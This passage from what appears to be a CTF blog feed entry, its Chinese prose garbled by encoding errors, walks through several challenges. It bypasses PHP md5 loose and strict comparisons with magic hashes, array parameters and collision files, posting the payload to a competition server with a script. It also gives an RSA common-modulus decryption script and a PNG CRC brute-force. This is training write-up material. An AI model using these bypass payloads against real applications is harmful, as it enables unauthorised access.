    <content type="html"><![CDATA[<p>æŠ—ç–«æŠ—ç–«ï¼æ¥è‡ªå®‰å…¨äººå‘˜çš„è¡ŒåŠ¨ï¼<a id="more"></a></p><h2 id="Web-easy-hash"><a href="#Web-easy-hash" class="headerlink" title="Web-easy-hash"></a>Web-easy-hash</h2><p>è€ƒå¯Ÿmd5å¼ºæ¯”è¾ƒã€å¼±æ¯”è¾ƒä»¥åŠmd5ç¢°æ’ï¼Œæœ¬é¢˜æ˜¯æ˜å®‰æ¯çš„audité¢˜æ”¹çš„ï¼Œå‚è€ƒgetflyå¸ˆå‚…çš„<a href="http://www.gtfly.top/2019/04/07/%E6%8E%98%E5%AE%89%E6%9D%AFwp.html#audit">åšå®¢</a>ã€‚</p><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿›å…¥é¢˜ç›®ï¼Œç»™å‡ºäº†æºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$val1 = @$_GET[<span class="string">'val1'</span>];</span><br><span class="line">$val2 = @$_GET[<span class="string">'val2'</span>];</span><br><span class="line">$val3 = @$_GET[<span class="string">'val3'</span>];</span><br><span class="line">$val4 = @$_GET[<span class="string">'val4'</span>];</span><br><span class="line">$val5 = (string)@$_POST[<span class="string">'val5'</span>];</span><br><span class="line">$val6 = (string)@$_POST[<span class="string">'val6'</span>];</span><br><span class="line">$val7 = (string)@$_POST[<span class="string">'val7'</span>];</span><br><span class="line"><span class="keyword">if</span>( $val1 == $val2 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val1 OR val2 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( md5($val1) != md5($val2) )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $val3 == $val4 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val3 OR val4 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( md5($val3) !== md5($val4))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( $val5 == $val6 || $val5 == $val7 || $val6 == $val7 )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'val5 OR val6 OR val7 no no no'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (md5($val5) !== md5($val6) || md5($val6) !== md5($val7) || md5($val5) !== md5($val7))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[<span class="string">'a'</span>];</span><br><span class="line">$b = $_POST[<span class="string">'b'</span>];</span><br><span class="line">$m = $_GET[<span class="string">'m'</span>];</span><br><span class="line">$n = $_GET[<span class="string">'n'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(ctype_alnum($a)) || (strlen($a) &gt; <span class="number">5</span>)  || !(ctype_alnum($b)) || (strlen($b) &gt; <span class="number">6</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"a OR b fail!"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((strlen($m) &gt; <span class="number">1</span>) || (strlen($n) &gt; <span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"m OR n fail"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$val8 = md5($a);</span><br><span class="line">$val9 = strtr(md5($b), $m, $n);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val8 : $val8&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;val9 : $val9&lt;/p&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> (($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === <span class="number">5</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"nice,good job,give you flag:"</span>;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">'/var/www/html/flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°æ»¡è¶³<code>md5å¼±æ¯”è¾ƒ</code>æ¡ä»¶çš„<code>val1</code>å’Œ<code>val2</code>ï¼Œè¿™ä¸ªç½‘ä¸Šæœ‰å¾ˆå¤šï¼š</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼š</span><br><span class="line">QNKCDZO</span><br><span class="line"><span class="number">0e830400451993494058024219903391</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1184209335a</span><br><span class="line"><span class="number">0e072485820392773389523109082030</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s155964671a</span><br><span class="line"><span class="number">0e342768416822451524974117254469</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s532378020a</span><br><span class="line"><span class="number">0e220463095855511507588041205815</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s214587387a</span><br><span class="line"><span class="number">0e848240448830537924465865611904</span></span><br><span class="line">s1502113478a</span><br><span class="line"><span class="number">0e861580163291561247404381396064</span></span><br><span class="line">s1091221200a</span><br><span class="line"><span class="number">0e940624217856561557816327384675</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s1885207154a</span><br><span class="line"><span class="number">0e509367213418206700842008763514</span></span><br><span class="line">s1836677006a</span><br><span class="line"><span class="number">0e481036490867661113260034900752</span></span><br><span class="line">s1665632922a</span><br><span class="line"><span class="number">0e731198061491163073197128363787</span></span><br><span class="line">s878926199a</span><br><span class="line"><span class="number">0e545993274517709034328855841020</span></span><br></pre></td></tr></table></figure><p>ç„¶åéœ€è¦åˆ©ç”¨<code>md5å¼ºæ¯”è¾ƒ</code>ç»•è¿‡å¯¹<code>val3</code>å’Œ<code>val4</code>çš„åˆ¤æ–­ï¼Œç”±äºæ²¡æœ‰è¦æ±‚æ˜¯å­—ç¬¦ä¸²ï¼Œå› æ­¤åˆ©ç”¨æ•°æ®è¿›è¡Œç»•è¿‡ï¼š</p><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">val3[]=<span class="number">1</span>&amp;val4[]=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>å†å¾€ä¸‹çœ‹ï¼Œå¯¹<code>val5</code>ã€<code>val6</code>å’Œ<code>val7</code>è¿›è¡Œäº†<code>(string)</code>çš„é™åˆ¶ï¼Œè¿™é‡Œçš„åˆ¤æ–­æ˜¯çœŸæ­£éœ€è¦è¿›è¡Œ<code>md5ç¢°æ’</code>äº†ï¼Œç½‘ä¸Šèƒ½æ‰¾åˆ°å¾ˆå¤šæ•°æ®æœ‰å¾®å°å·®åˆ«ä½†æ˜¯md5å€¼ç›¸åŒçš„ä¾‹å­ï¼Œä½†æ˜¯éƒ½æ˜¯ä¸¤ä¸ªä¸€å¯¹çš„ï¼Œä½†æ˜¯æœ¬é¢˜æœ‰ä¸‰ä¸ªå˜é‡ï¼Œéœ€è¦å€ŸåŠ©<a href="https://github.com/thereal1024/python-md5-collision">è¿™ä¸ªå·¥å…·</a>æ¥ç”Ÿæˆå€¼ä¸åŒä½†æ˜¯md5ç›¸åŒçš„æ–‡ä»¶ã€‚</p><p>ç„¶åæ˜¯å¯¹<code>a</code>ã€<code>b</code>ã€<code>m</code>å’Œ<code>n</code>çš„åˆ¤æ–­ï¼š<br><code>ctype_alnum($a\b)</code>åˆ¤æ–­<code>a\b</code>æ˜¯å¦æ˜¯å­—æ¯å’Œæ•°å­—æˆ–å­—æ¯æ•°å­—çš„ç»„åˆï¼›<br>åŒæ—¶è¦æ±‚<code>m</code>å’Œ<code>n</code>é•¿åº¦ä¸èƒ½è¶…è¿‡<code>1</code>ã€‚</p><p>ç„¶åä»¤<code>$val8 = md5($a)</code>ï¼Œ<code>$val9 = strtr(md5($b), $m, $n)</code>å°†<code>md($b)</code>ä¸­ä¸<code>$m</code>ç›¸åŒçš„å€¼æ›¿æ¢ä¸º<code>$n</code>çš„å€¼ã€‚<br>æœ€åè¿˜éœ€è¦æ»¡è¶³<code>($val8 == $val9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 5)</code>ï¼Œè¿™ä¸ªåœ°æ–¹åˆ©ç”¨<code>md5</code>å¼±ç¢°æ’å°±è¡Œï¼Œåˆ©ç”¨<code>QNKCDZO/0e830400451993494058024219903391</code>ç±»çš„å­—ç¬¦ä¸²ï¼Œæ‰¾ä¸€ä¸ªé•¿åº¦ä¸º<code>5</code>ä¸”md5å€¼ä»¥<code>0e</code>å¼€å¤´åé¢å…¨æ˜¯æ•°å­—çš„å­—ç¬¦ä¸²<code>$a</code>ï¼Œå¦æ‰¾ä¸€ä¸ª<code>0e</code>å¼€å¤´åé¢ä¸ºçº¯æ•°å­—/ä¸€ä½å­—æ¯çš„å­—ç¬¦ä¸²<code>$b</code>ï¼Œè‹¥<code>0e</code>åé¢æ˜¯ä¸€ä¸ªå­—æ¯å’Œå…¶ä»–çš„æ•°å­—ï¼Œåˆ©ç”¨<code>strtr()</code>å‡½æ•°å°†å…¶md5å€¼ä¸­å­—æ¯æ”¹ä¸ºæ•°å­—å³å¯ã€‚</p><p>éš¾ç‚¹å°±åœ¨äºæ‰¾æ»¡è¶³è¦æ±‚çš„<code>$a</code>å’Œ<code>$b</code>çš„å€¼äº†ï¼Œè¿™é‡Œå‚è€ƒgetflyå¸ˆå‚…çš„è„šæœ¬æ¥çˆ†ç ´ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># çˆ†ç ´æ•°å­—+å­—æ¯ï¼Œæ‰¾åˆ°ç¬¦åˆmd5åä¸º0eå¼€å¤´ï¼Œä¸”åé¢ä¸ºçº¯æ•°å­—/ä¸€ä½å­—æ¯çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = string.ascii_lowercase + string.ascii_uppercase + string.digits</span><br><span class="line"></span><br><span class="line">time = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> itertools.permutations(dic, <span class="number">5</span>):</span><br><span class="line">    print(<span class="string">'trying'</span>, time)</span><br><span class="line">    time += <span class="number">1</span></span><br><span class="line">    i = <span class="string">''</span>.join(n)</span><br><span class="line">    li = [<span class="number">0</span>] * <span class="number">26</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    strs = hashlib.md5(str(i).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> strs[:<span class="number">2</span>] == <span class="string">'0e'</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> strs[<span class="number">2</span>:]:</span><br><span class="line">            <span class="keyword">if</span> ord(j) &gt;= <span class="number">97</span>:</span><br><span class="line">                li[ord(j)<span class="number">-97</span>] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> li:</span><br><span class="line">            <span class="keyword">if</span> k != <span class="number">0</span>:</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count &lt; <span class="number">1</span>:</span><br><span class="line">            print(i)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æœ€ååˆ©ç”¨æ„é€ å¥½çš„payloadå†™è„šæœ¬æ‹¿flagã€‚</p><h3 id="è§£é¢˜è„šæœ¬"><a href="#è§£é¢˜è„šæœ¬" class="headerlink" title="è§£é¢˜è„šæœ¬"></a>è§£é¢˜è„šæœ¬</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://183.129.189.60:10004/?val1=QNKCDZO&amp;val2=s878926199a&amp;val3[]=1&amp;val4[]=2&amp;m=a&amp;n=1'</span></span><br><span class="line"></span><br><span class="line">file1 = open(<span class="string">'out_test_000.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">file2 = open(<span class="string">'out_test_001.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line">file3 = open(<span class="string">'out_test_002.txt'</span>, <span class="string">'rb'</span>).read()</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'val5'</span>:file1, <span class="string">'val6'</span>:file2, <span class="string">'val7'</span>:file3, <span class="string">'a'</span>:<span class="string">'byGcY'</span>, <span class="string">'b'</span>:<span class="string">'aOtm2'</span>&#125;</span><br><span class="line"></span><br><span class="line">s = requests.post(url, data)</span><br><span class="line">print(s.text)</span><br></pre></td></tr></table></figure><h2 id="Crypto-å¤å…¸å¯†ç "><a href="#Crypto-å¤å…¸å¯†ç " class="headerlink" title="Crypto-å¤å…¸å¯†ç "></a>Crypto-å¤å…¸å¯†ç </h2><p>è¿›å…¥é¢˜ç›®ï¼Œåˆ†åˆ«ç»™äº†ä¸€ç»„<code>å‡¯æ’’å¯†ç </code>åŠ å¯†çš„å­—ç¬¦ä¸²ã€ä¸€ç»„<code>morseç </code>ã€ä¸€ç»„<code>æ …æ å¯†ç </code>åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œåˆ†åˆ«è§£å¯†å³å¯ã€‚</p><h2 id="Crypto-RSA"><a href="#Crypto-RSA" class="headerlink" title="Crypto-RSA"></a>Crypto-RSA</h2><p>è·Ÿå‰ä¸¤å¤©Ichunqiuçš„æŠ—ç–«èµ›ä¸­çš„ä¸€é“RSAé¢˜ä¸€æ ·ï¼Œè€ƒå¯Ÿå…±æ¨¡æ”»å‡»</p><h3 id="è§£é¢˜-1"><a href="#è§£é¢˜-1" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>é™„ä»¶ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=pow(m,e,n)</span><br><span class="line"><span class="keyword">print</span> c,e,n</span><br><span class="line"></span><br><span class="line">e=<span class="number">11187289</span></span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=pow(m,e,n)</span><br><span class="line"><span class="keyword">print</span> c,e,n</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">3398498381912395819190972489172462865619978412426461006637853132394421358554444085509204376417687407497725837275868696481008111895766215578504776574832032556271718345687763315140723387608016365200919607751172500433727679269003098314988424638473027123820847847826679169000817669427223462669128173658466684135284118199815059085013479646863344355311315928713888347485004116168388822942797985291207722712351376891776564431593839662958249777540851019964959285093222467104765037231393043482615879794268339523066822738215251088897330388858109680412562153811860413533184870172160079371279534423386236128033224501238509297353 65537 21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933</span></span><br><span class="line"><span class="string">3466733921305804638105947202761163747472618602445995245253771384553216569474005211746398256742813639292824489920799418551206486872148557599625985549276697777903434273072767901043963396047653458242735767809413051298636887840641872939342025101757793615068691040228073377366562557622977332819376942596081135968249279010542277871138668977160241877260538203101507006391433015105607006204397243716334344883925947719719479074061998068934050946968531874465924912747079003982022188875112147185558223515367430238618463189740762128953957802291125793882636020335117593003197811477506533564676975831899876919568948425610130348710 11187289 21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>æ˜æ˜¾åœ°çœ‹å‡ºæ˜¯ä½¿ç”¨ç›¸åŒçš„æ¨¡æ•°<code>n</code>ã€ä¸¤ä¸ªä¸åŒçš„<code>e</code>ç”Ÿæˆäº†ä¸¤ä¸ªå¯†æ–‡<code>c</code>ï¼Œç›´æ¥ä¸ŠPOCï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, x = egcd(b % a, a)</span><br><span class="line">      <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span><span class="params">(a, m)</span>:</span></span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">raise</span> Exception(<span class="string">'modular inverse does not exist'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line">n = <span class="number">21550279102644053137401794357450944302610731390301294678793250727396089358072700658571260795910112265309568014296122288384516447895827201111531054386530016432904989927216701507587366446802666848322853781729905492728655474832512381505627940555854308364578108265962388044363133246414753768229564846275154311898383993892293297122428661960946207950994560898964054913194462187242818633295970027741085201122155726130759045957757833942616544066055081600792366411691979350744894938994915328874600229684477533220240489600171746943849179803693122081888324258987779131223150589953248929679931142134208151043000793272520874205933</span></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">e2 = <span class="number">11187289</span></span><br><span class="line">c1 = <span class="number">3398498381912395819190972489172462865619978412426461006637853132394421358554444085509204376417687407497725837275868696481008111895766215578504776574832032556271718345687763315140723387608016365200919607751172500433727679269003098314988424638473027123820847847826679169000817669427223462669128173658466684135284118199815059085013479646863344355311315928713888347485004116168388822942797985291207722712351376891776564431593839662958249777540851019964959285093222467104765037231393043482615879794268339523066822738215251088897330388858109680412562153811860413533184870172160079371279534423386236128033224501238509297353</span></span><br><span class="line">c2 = <span class="number">3466733921305804638105947202761163747472618602445995245253771384553216569474005211746398256742813639292824489920799418551206486872148557599625985549276697777903434273072767901043963396047653458242735767809413051298636887840641872939342025101757793615068691040228073377366562557622977332819376942596081135968249279010542277871138668977160241877260538203101507006391433015105607006204397243716334344883925947719719479074061998068934050946968531874465924912747079003982022188875112147185558223515367430238618463189740762128953957802291125793882636020335117593003197811477506533564676975831899876919568948425610130348710</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">   s1 = - s1</span><br><span class="line">   c1 = modinv(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">   s2 = - s2</span><br><span class="line">   c2 = modinv(c2, n)</span><br><span class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line"><span class="keyword">print</span> (binascii.unhexlify(hex(m)[<span class="number">2</span>:].strip(<span class="string">"L"</span>)))</span><br></pre></td></tr></table></figure><h2 id="Misc-lemonEssence"><a href="#Misc-lemonEssence" class="headerlink" title="Misc-lemonEssence"></a>Misc-lemonEssence</h2><p>è€ƒå¯ŸCRCçˆ†ç ´</p><h3 id="è§£é¢˜-2"><a href="#è§£é¢˜-2" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ä¸‹è½½å‹ç¼©åŒ…è§£å‹å‡ºå¦‚ä¸‹ä¸€å¼ <code>PNG</code>å›¾ç‰‡ï¼š<br><img src="http://www.ggb0n.cool/images/anheng2.png" alt=""><br>ç¼©ç•¥å›¾å¯ä»¥çœ‹ï¼Œä½†æ˜¯æ”¾å¤§ä¹‹åçœ‹ä¸äº†ï¼ŒçŒœæµ‹æ˜¯å¯¹å…¶é«˜æˆ–å®½è¿›è¡Œäº†æ›´æ”¹ï¼Œéœ€è¦è¿›è¡Œ<code>CRCçˆ†ç ´</code>ä»¥è·å¾—åŸæ¥çš„å®½å’Œé«˜ï¼Œä¿®æ”¹å›å»å°±è¡Œäº†ã€‚<br>åˆ©ç”¨Winraræ‹¿åˆ°å…¶CRCï¼Œç„¶ååˆ©ç”¨ä¸‹é¢çš„è„šæœ¬çˆ†ç ´ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crc32key = <span class="number">0x986B9E93</span></span><br><span class="line">data = bytearray(<span class="string">b'\x49\x48\x44\x52\x00\x00\x01\x69\x00\x00\x01\x25\x08\x02\x00\x00\x00'</span>) <span class="comment">#è¡¨ç¤ºå®½å’Œé«˜éƒ¨åˆ†çš„å­—èŠ‚(13-29bytes)</span></span><br><span class="line">n = <span class="number">4095</span> <span class="comment">#ç†è®ºä¸Š0xffffffff,ä½†è€ƒè™‘åˆ°å±å¹•å®é™…/cpuï¼Œ0x0fffå°±å·®ä¸å¤šäº†</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(n):<span class="comment">#é«˜å’Œå®½ä¸€èµ·çˆ†ç ´</span></span><br><span class="line">    width = bytearray(struct.pack(<span class="string">'&gt;i'</span>, w))<span class="comment">#qä¸º8å­—èŠ‚ï¼Œiä¸º4å­—èŠ‚ï¼Œhä¸º2å­—èŠ‚</span></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> range(n):</span><br><span class="line">        height = bytearray(struct.pack(<span class="string">'&gt;i'</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            print(width,height)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>æŠŠçˆ†ç ´å‡ºåœ°ç»“æœä¸å›¾ç‰‡æ•°æ®å¯¹æ¯”ï¼Œå‘ç°é«˜çš„éƒ¨åˆ†è¢«æ›´æ”¹äº†ï¼Œå¦‚å›¾æ›´æ”¹å›å»å³å¯çœ‹åˆ°flagï¼š<br><img src="http://www.ggb0n.cool/images/anheng3.png" alt=""><br><img src="http://www.ggb0n.cool/images/anheng1.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æŠ—ç–«æŠ—ç–«ï¼æ¥è‡ªå®‰å…¨äººå‘˜çš„è¡ŒåŠ¨ï¼
    
    </summary>
    
    
      <category term="CTF" scheme="http://ggb0n.cool/categories/CTF/"/>
    
      <category term="æ¯”èµ›åˆ’æ°´" scheme="http://ggb0n.cool/categories/CTF/%E6%AF%94%E8%B5%9B%E5%88%92%E6%B0%B4/"/>
    
    
      <category term="RSAæ”»å‡»" scheme="http://ggb0n.cool/tags/RSA%E6%94%BB%E5%87%BB/"/>
    
      <category term="md5ç¢°æ’" scheme="http://ggb0n.cool/tags/md5%E7%A2%B0%E6%92%9E/"/>
    
      <category term="md5å¼±æ¯”è¾ƒ" scheme="http://ggb0n.cool/tags/md5%E5%BC%B1%E6%AF%94%E8%BE%83/"/>
    
      <category term="md5å¼ºæ¯”è¾ƒ" scheme="http://ggb0n.cool/tags/md5%E5%BC%BA%E6%AF%94%E8%BE%83/"/>
    
      <category term="RSAå…±æ¨¡æ”»å‡»" scheme="http://ggb0n.cool/tags/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/"/>
    
      <category term="CRC32çˆ†ç ´" scheme="http://ggb0n.cool/tags/CRC32%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>ichunqiuæ–°æ˜¥æˆ˜ç–«èµ›-WriteUp</title>
    <link href="http://ggb0n.cool/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/"/>
    <id>http://ggb0n.cool/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/</id>
    <published>2020-02-21T14:14:19.000Z</published>
    <updated>2020-05-13T03:08:00.292Z</updated>
    
